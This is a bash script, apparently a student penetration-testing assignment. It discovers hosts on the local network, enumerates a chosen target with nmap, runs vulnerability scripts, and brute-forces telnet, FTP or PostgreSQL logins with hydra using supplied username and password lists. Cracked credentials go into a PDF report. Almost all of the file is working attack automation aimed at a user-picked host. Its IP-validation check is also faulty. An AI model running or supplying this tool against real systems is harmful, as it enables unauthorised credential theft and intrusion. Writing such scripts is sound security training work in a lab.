#!/bin/bash
#######################################################################
# Student Name: Chow Zhen Jie
# Student Code: S29
# Class Code: CFC090423
# Lecturer Name: Kar Wei
#######################################################################

### Identify the LAN network range ###
function scan_lan_network_range()
{
	# Use local IP Address to find network address (first three octets)
	LOCAL_IP_ADDRESS=$(ifconfig | grep broadcast | awk '{print $2}')
	NETWORK_ADDRESS=$(ifconfig | grep broadcast | awk '{print $2}' | awk '{print substr($0, 0, 11)}')
	
	# Find the network address range
	NETWORK_RANGE=$(netmask -r $LOCAL_IP_ADDRESS/24)
	
	# Print network range
	echo "Network range:$NETWORK_RANGE"
}

### Scan current LAN for available devices ###
function scan_current_lan_network()
{
	# Scan for all devices on the current LAN
	sudo nmap -sn $LOCAL_IP_ADDRESS/24 | grep 'Nmap scan report for' | awk '{print($NF)}' > nmap_results.txt
	
	NMAP_RESULTS=$(cat nmap_results.txt)
	
	# Filter out IP Addresses that are not assigned by DHCP server
	echo "" > hosts.txt
	for line in $NMAP_RESULTS
	do
		if [ $line != $NETWORK_ADDRESS.1 ] && [ $line != $NETWORK_ADDRESS.2 ] && [ $line != $NETWORK_ADDRESS.254 ] && [ $line != $LOCAL_IP_ADDRESS  ]
		then
			echo -e "$line" >> hosts.txt
		fi
	done
	
	# Print IP Address on the LAN
	HOSTS=$(cat hosts.txt |  tr -s '\n' ' ')
	echo "Host found in LAN: ${HOSTS}"
}

### Read IP Address from user ###
function read_ip_address()
{
	WRONG_IP=0
	
	# Ensure only IP Address on current LAN can be entered by user 
	while [ $WRONG_IP == 0 ]
	do
		read -p "Enter an IP Address to scan: " TARGET_IP
		if [ $TARGET_IP == $HOSTS ]
		then
			WRONG_IP=1
		else
			echo "Please reenter an IP Address that is in the Network Range."
		fi
	done
}

### Scan and enumerate the target host for open ports and services ###
function enumerate_host()
{
	echo "Enumerating Target Host..."
	sudo nmap -sV -O -p- $TARGET_IP -oA $TARGET_IP > enumerate_host.txt
}

### Print Open Ports and Services for target host ###
function read_enumerate_data()
{
	echo "****************************************************************************************"
	echo "* Open Ports and Services for Host:                                                    *"
	echo "****************************************************************************************"
	ENUMERATE_HOST_RESULTS=$(cat enumerate_host.txt | grep open)
	echo "${ENUMERATE_HOST_RESULTS}"
}

### Scan potential vulnerabilities on the target host ###
function scan_vulnerability()
{
	echo "Scanning for vulnerabilities..."
	
	echo "" > vuln.txt
	
	# Scan target host using nmap vulnerabilities scanning script
	sudo nmap --script vuln -sV -p- $TARGET_IP >> vuln.txt
}

### Print vulnerabilities found ###
function read_vulnerabilities_found()
{
	echo "****************************************************************************************"
	echo "* Vulnerabilities found:                                                               *"
	echo "****************************************************************************************"
	
	# Print the vulnerabilities CVE found
	VULN=$(cat vuln.txt | grep -e CVE -e open)
	
	echo "${VULN}"
}

### Ask user to enter a users list filename ###
function get_users_list()
{
	read -p "Enter users list: " USERS_LIST
	
	# Check if the users list file exist on current directory
	if [ ! -f "$USERS_LIST" ]
	then
		echo "This is not a file"
	fi	
}

### Ask user to specify a password list or create a password list ###
function choose_or_create_passwords_list()
{
	echo "Do you want to choose or create a passwords list?"
	echo "a) Enter password list"
	echo "b) Create password list"
	read -p "Enter options: " OPTIONS
	
	case $OPTIONS in
	a|A)
		get_passwords_list
	;;
	b|B)
		create_passwords_list
	;;
	esac 
}

### Ask user to enter a password list filename ###
function get_passwords_list()
{
	echo "" > passwords_list.txt
	
	read -p "Enter passwords list: " PASSWORDS_LIST
	
	# Check if the password list file exist on current directory
	if [ -f "$PASSWORDS_LIST" ]
	then
		cp $PASSWORDS_LIST passwords_list.txt
	else
		echo "This is not a valid filename."
	fi
}

### Ask user to enter passwords to create the passwords list ###
function create_passwords_list()
{
	echo "" > passwords_list.txt
	
	echo "Creating password list..."
	read -p "Type passwords and click enter, enter 'q' to stop: " PASSWORD
	
	# Request passwords from user until the user type 'q' to quit
	while [ $PASSWORD != 'q' ]
	do
		echo $PASSWORD >> passwords_list.txt
		read -p "Type passwords and click enter, enter 'q' to stop: " PASSWORD
	done
	
	echo "The passwords list passwords_list.txt was created!"
}

### Choose the port to brute force using the configure file service_exploit.txt ###
function choose_login_service()
{
	SERVICE_EXPLOIT_LIST=$(cat service_exploit.txt | awk '{print $1}' | awk -F'/' '{print $1}')
	ENUMERATE_HOST_RESULT_PORT=$(cat enumerate_host.txt | grep open | awk '{print $1}' | awk -F'/' '{print $1}')
	PORT_NUMBER=0
	
	# Select the port to exploit based on the order
	for SERVICE_EXPLOIT in $SERVICE_EXPLOIT_LIST
	do		
		for ENUMERATE_HOST in $ENUMERATE_HOST_RESULT_PORT
		do
			if [ "$SERVICE_EXPLOIT" == "$ENUMERATE_HOST" ]
			then
				PORT_NUMBER=$SERVICE_EXPLOIT
				break 2
			fi
		done
	done
}

### Brute force the selected port using hydra ###
function brute_force_login_service()
{
	choose_login_service
	
	SERVICE=$PORT_NUMBER
	
	echo "****************************************************************************************"
	echo "*           Found vulnerable service, attacking port number: $PORT_NUMBER                        *"
	echo "****************************************************************************************"          
	
	echo "" > hydra_test_result.txt
	
	# Brute force the selected port service
	case $SERVICE in
	1524)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP telnet -s 1524 -I -vV > hydra_test_result.txt
	;;
	21)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP ftp -s 21 -I -vV > hydra_test_result.txt
	;;
	2121)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP ftp -s 2121 -I -vV > hydra_test_result.txt
	;;
	5432)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP postgres -s 5432 -I -vV > hydra_test_result.txt
	;;
	23)
		hydra -L $USERS_LIST -P passwords_list.txt $TARGET_IP telnet -s 23 -I -vV > hydra_test_result.txt
	;;
	esac 
}

### Create the Penetration Test Report in textfile format ###
function create_text_report()
{
	echo "" > Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	echo "*                     Penetration Test Report                      *" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	REPORT_TIME_OF_SCAN=$(cat enumerate_host.txt | grep Starting | awk '{print $(NF-1)}')
	echo "Time of scan: ${REPORT_TIME_OF_SCAN}" >> Pentest_Report.txt	
	
	REPORT_NUMBER_OF_DEVICE=$(cat hosts.txt | grep 192.168 | wc -l)
	echo "Device found on Network: ${REPORT_NUMBER_OF_DEVICE}" >> Pentest_Report.txt
	
	REPORT_DEVICE_IP_ADDRESS=$(cat hosts.txt | grep 192.168 )
	echo "Device IP address found: ${REPORT_DEVICE_IP_ADDRESS}" >> Pentest_Report.txt
	
	REPORT_NUMBER_OF_OPEN_PORTS=$(cat enumerate_host.txt | grep open | wc -l )
	echo "Open ports found on Network: ${REPORT_NUMBER_OF_OPEN_PORTS}" >> Pentest_Report.txt
	
	REPORT_IP_ADDRESS_SCANNED=$TARGET_IP
	echo "IP address scanned: ${REPORT_IP_ADDRESS_SCANNED}" >> Pentest_Report.txt
	
	echo "" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	echo "*     Open Ports and Services ON Target IP Address ${TARGET_IP}    *" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	REPORT_OPEN_PORTS_FOUND=$(cat enumerate_host.txt | grep open)
	echo "${REPORT_OPEN_PORTS_FOUND}" >> Pentest_Report.txt
	
	echo "" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	echo "*                  Usernames and Passwords Found                   *" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	REPORT_LOGIN=$(cat hydra_test_result.txt | grep password | awk '{print $4 $5 " " $6 $7}' | grep -v successful)
	echo "${REPORT_LOGIN}" >> Pentest_Report.txt
	
	echo "" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt
	echo "*                       Vulnerabilities found                      *" >> Pentest_Report.txt
	echo "********************************************************************" >> Pentest_Report.txt	
	REPORT_VULN=$(cat vuln.txt | grep -e CVE -e open)
	echo "${REPORT_VULN}" >> Pentest_Report.txt
}

### Convert the textfile report into PDF format ###
function convert_report_to_pdf()
{
	CHECK_LIBREOFFICE=$(dpkg --list | grep libreoffice | grep amd64 | awk '{print $2}' | head -n 1 )
	
	# Check if libreoffice is installed, install libreoffice if necessary
	if [ -z $CHECK_LIBREOFFICE ]
	then
		echo "Installing Libreoffice..."
		
		sudo apt-get install libreoffice
	fi
	
	echo "Libreoffice is installed"
	
	# Convert the textfile report into PDF format
	soffice --convert-to pdf ./Pentest_Report.txt
	
	echo "Pentest_Report.pdf was generated."
}

scan_lan_network_range
scan_current_lan_network
read_ip_address
get_users_list
choose_or_create_passwords_list
enumerate_host
read_enumerate_data
scan_vulnerability
read_vulnerabilities_found
brute_force_login_service
create_text_report
convert_report_to_pdf
